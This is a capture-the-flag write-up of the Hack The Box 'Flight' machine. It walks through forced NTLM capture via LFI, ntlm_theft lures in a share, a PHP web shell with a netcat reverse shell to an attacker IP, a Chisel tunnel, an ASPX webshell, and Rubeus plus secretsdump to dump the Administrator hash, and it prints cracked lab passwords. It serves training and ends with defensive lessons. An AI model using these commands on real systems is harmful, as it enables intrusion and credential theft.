| Syntropy Intel: 🧠 [Mental Model](../../../00-Mental-Models/The-Watering-Hole-Principle.md) | 🛡️ [Detection Rules](../../../02-Detection-Engineering/Detection-Flight-Artifacts.md) |

# Hack The Box (HTB) Flight Machine Writeup | [54nK4lP3x3]

**Hack the Box machine walkthrough of [HTB Flight](https://app.hackthebox.com/machines/Flight) by: [54nK4lP3x3](https://github.com/Sanka1pp)**

## 1. Executive Summary

**Objective:** Compromise the "Flight" Domain Controller to achieve total domain dominance.
**Outcome:** **Critical Compromise** (Domain Admin Authority Achieved).

**The Kill Chain:**
1.  **Recon:** Discovery of `school.flight.htb` and an LFI vector via the `view` parameter.
2.  **Credential Theft (The Trap):** Exploiting LFI to force NTLM authentication to a rogue SMB listener (`Responder`), capturing `svc_apache` credentials.
3.  **Lateral Movement (The Watering Hole):** Identifying a writable share (`Shared`) accessed by other users. deploying `ntlm_theft` payloads to capture `C.Bum` credentials.
4.  **Foothold:** Abusing write access to the `Web` share to deploy a PHP backdoor and `nc64.exe`, executing via `curl`.
5.  **Tunneling:** Establishing a `Chisel` tunnel to access the internal development IIS server on Port 8000.
6.  **Privilege Escalation:** Uploading an ASPX webshell to `C:\inetpub\development`, escalating to `IIS AppPool\DefaultAppPool`.
7.  **Domain Dominance:** Abusing `SeImpersonatePrivilege` via `Rubeus tgtdeleg` to request a TGT, dumping the Administrator's NTLM hash via `secretsdump`.

**Attack Path Visual:**
![Attack Path](Assets/Flight_Path.png)
*Figure 1: The complete attack chain from LFI to Domain Admin.*

---

## 2. Reconnaissance: The Open Sky
**The Filter:**
Initial scanning identified a Windows Domain Controller exposing standard AD ports (53, 88, 135, 445) and a web server on Port 80.
* **Domain:** `flight.htb`
* **Subdomain:** `school.flight.htb`

**The Anomaly (LFI):**
The `school.flight.htb` endpoint utilized a `view` parameter (`index.php?view=home.html`). Fuzzing this parameter revealed it was vulnerable to Local File Inclusion. Instead of reading local files (which were blocked), we aimed the LFI at our attacker machine (`\\10.10.16.160\fakeshare`).

* **Action:** Forced Authentication.
* **Result:** `svc_apache` NTLMv2 hash captured by Responder.
* **Cracked:** `S@Ss!K@*t13`

---

## 3. Lateral Movement: The Watering Hole
**The Pivot:**
Password spraying revealed `S.Moon` shared the same credentials as `svc_apache`. Accessing the system as `S.Moon` revealed a critical asset: a **Writable Share** named `Shared`.

**The Logic:**
A writable share is not a vulnerability in itself; it is a trap. We identified that the user `C.Bum` frequents this share.
* **Tool:** `ntlm_theft`
* **Payload:** `desktop.ini` / `.scf` files placed in the share.
* **Execution:** When `C.Bum` browsed the share, their client automatically attempted to authenticate to us.

**Outcome:**
Captured `C.Bum` NTLMv2 hash.
* **Cracked:** `Tikkycoll_431012284`

---

## 4. Foothold & Tunneling
**Webroot Compromise:**
`C.Bum` possessed Write access to the `Web` share (`C:\inetpub\wwwroot\flight.htb`). This allowed us to upload a PHP shell (`revshl.php`) and a static netcat binary (`nc64.exe`).

* **Execution:** `curl -G http://flight.htb/revshl.php --data-urlencode "c=nc64.exe -e cmd.exe 10.10.10.10 9001"`
* **Result:** Reverse shell as `flight\svc_apache`.

**Internal Pivot (Chisel):**
Internal enumeration revealed port **8000** listening locally. This was blocked from the outside.
* **Action:** Deployed `Chisel` (Server on Kali, Client on Target).
* **Command:** `.\chisel_client.exe client 10.10.16.160:8000 R:8001:127.0.0.1:8000`
* **Access:** `http://localhost:8001` (Mapped to Target:8000).

---

## 5. Privilege Escalation: The Service Account
**The Development Site:**
The tunneled port hosted a development site at `C:\inetpub\development`. Checking permissions with `icacls` confirmed `C.Bum` had **Write** access.

**Webshell Upload:**
1.  Generated `tunneled_payload.aspx`.
2.  Uploaded to `development` folder via SMB.
3.  Triggered via the Chisel tunnel.
4.  **Result:** Shell as `iis apppool\defaultapppool`.

**The Potato Attack (Rubeus):**
The IIS account held the `SeImpersonatePrivilege`. Instead of standard Potato exploits, we utilized `Rubeus` with the `tgtdeleg` trick. This abuses the Kerberos Unconstrained Delegation often allowed for machine accounts.

* **Command:** `.\Rubeus.exe tgtdeleg /nowrap`
* **Mechanism:** Requests a TGT for the current user, which is elevated to a usable ticket.
* **Extraction:** Decoded the base64 Kirby ticket -> Converted to CCache -> Injected into environment.

**Final Blow:**
With the ticket in memory, we performed a DCSync.
* **Command:** `impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator`
* **Flag:** Root Authority Secured.

---

## 6. Syntropy Retrospective
**Why This Happened:**
The chain relied on "Permission Creep" and "Implicit Trust".
1.  **Shared Passwords:** `svc_apache` and `S.Moon` sharing credentials bridged the first gap.
2.  **The Watering Hole:** Users blindly browsing shared folders (`Shared`) allowed for passive credential theft.
3.  **Over-privileged Service:** The IIS account having `SeImpersonate` is a default setting, but critical when combined with write access to the webroot.
